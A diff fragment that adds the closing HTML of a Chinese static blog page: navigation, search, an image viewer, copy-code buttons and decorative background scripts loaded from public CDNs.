+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
